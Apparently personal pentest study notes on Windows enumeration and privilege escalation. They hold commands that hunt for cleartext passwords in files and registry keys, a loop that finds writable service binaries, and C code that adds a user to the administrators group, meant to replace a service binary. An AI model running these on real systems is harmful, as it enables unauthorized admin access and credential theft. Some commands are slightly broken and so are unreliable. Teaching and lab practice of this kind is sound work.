# Internal Enumeration - Windows

Many priv-esc techniques on windows comes from third-party programs and not necessarily windows in itself. Therefore it is important to really learn to enumerate the system and find those vulnerable programs.


http://netsec.ws/?cat=64

http://netsec.ws/?p=314

## Info about the system


schtasks /query /fo LIST /v
schtasks /query /fo LIST /v
net start
accesschk.exe -uwcqv "Authenticated Users" *
dir network-secret.txt /s
windump -i 2 -w capture -n -U -s 0 src not 10.11.0.X and dst not 10.11.0.X



```
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname

#Who am I?
whoami
echo %username%

#What users are on the machine?
net users

#More info about a specific user
net user user1
```

## Firewall

```
netsh firewall show state
netsh firewall show config
```

## Network

```
ipconfig /all

route print

#Display all available interfaces
arp -A
```

### Active connections

```
netstat -ano

#Firewall rules
netsh firewall show state
netsh firewall show config
```
So how should we interpret the netstat output? Here is an example, now what does this mena?

```
Proto  Local address      Remote address     State        User  Inode  PID/Program name
    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
```

**Important to understand**
Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can recieve a connection from the network card, from the loopbak interface or any other interface. 

Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else.

Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. 

## Processes running

```
# The cronjob of windows
schtasks /query /fo LIST /v

# Running processes
tasklist /SVC
net start


# List all drivers
driverquery
```

## Users and domain

```
net users
net localgroups

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>
```

### List all patches

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## References

http://www.fuzzysecurity.com/tutorials/16.html


# Privilege escalation windows


https://www.reddit.com/r/AskNetsec/comments/3ujqu3/best_windows_privilege_escalation_resources/
"Enumeration.
You don't always need to run some exploit to get higher privileges, just convince some service that is running as admin or SYSTEM to open nc.exe for you. Web services are often misconfigured and running as admin or system.
Also look at modifying a startup service to run nc.exe or your malicious binary. replace UPnP with your backdoor.
Source: OSCP and OSCE; Never used exploits to get privilege escalation on the windows machines in the lab or exam"

Look for vulnerable services that may be running as system

There are usually three types of users on a windows machine:

1. System
2. Administrator
3. Regular user

## Metasploit - The easy way

So if you have a metasploit meterpreter session going you can run **getsystem**.

### Post modules

First you need to background the meterpreter shell and then you just run the post modules.
You can also try some different post modules. 

**Find weak service permissions**

```
use exploit/windows/local/service_permissions
```

## Manually

### Cleartext passwords

Can be find like this:
```
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
```

Thse are common files to find them in. They might be base64-encoded. So look out for that. 

**In files**
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

**In registry**
```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

### Kernel exploits

Just as in windows kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. 

#### Python to binary

If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know.

### Misconfigurations

#### Weak ervice permissions

If you find a service that has read-write permissions set to everyone you can just change that binary into a binary that adds a user to the administrators group and thereby giving it privileges.

First we need to find services. That can be done using **wmci**. Wmci is not availbe on all windows machines, and it might not be avaliable to your user. But if it is, you can use it like this:

```
wmic service list brief
```
This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icalcs program. Notice that icalcs is only available from Vista and up. XP has calcs instead.

As you can see in the command you need to make sure that you have access to wimc, icalcs and write privilege in windows\temp.

```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

Binaries in system32 are excluded sine they are mostly correct, since they are installed by windows. What we are interested in is binaries that have been installed by the user.In the output you want to look for **BUILTIN\Users:(F)**. That means your user has write access. So you can just rename the .exe file and add your own. And then restart the program and your program will be exevuted instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.


Here is a POC code for getsuid.

```c
#include <stdlib.h>
int main ()
{
int i;
i=system ("net localgroup administrators theusername /add");
return 0;
}
```

We then compile it with out cross-compiler, if you are on linux, like this:

```
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```

Okay, so now that we have either create our setuid or our reverse shell we need to restart the program, we can do that using wmci. Like this

```
wmic service NAMEOFSERVICE call startservice
```

If your meterpreter session dies you need to remember to first migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this

```
wmic process list brief | find "winlogon"
```

So when you get the shell you can either type **migrate PID** or automate this so that meterpreter automatically migrates.  

**Using metasploit**
```
use exploit/windows/local/service_permissions
```

### Unquoted Service Paths

This attack is explained here:
http://toshellandback.com/2015/11/24/ms-priv-esc/

There is also a metasploit module for this is: exploit/windows/local/trusted_service_path


### Vulnerable Services

#### Service Binaries

#### Windows Services


### AlwaysInstallElevated

http://toshellandback.com/2015/11/24/ms-priv-esc/

### Unattended Installs


### Group Policy Preferences (GPP)



Most recommended article

http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/
http://www.fuzzysecurity.com/tutorials/16.html

https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html

https://github.com/gentilkiwi/mimikatz

http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html

https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be

https://www.youtube.com/watch?v=PC_iMqiuIRQ

http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/

https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

http://pwnwiki.io/#!privesc/windows/index.md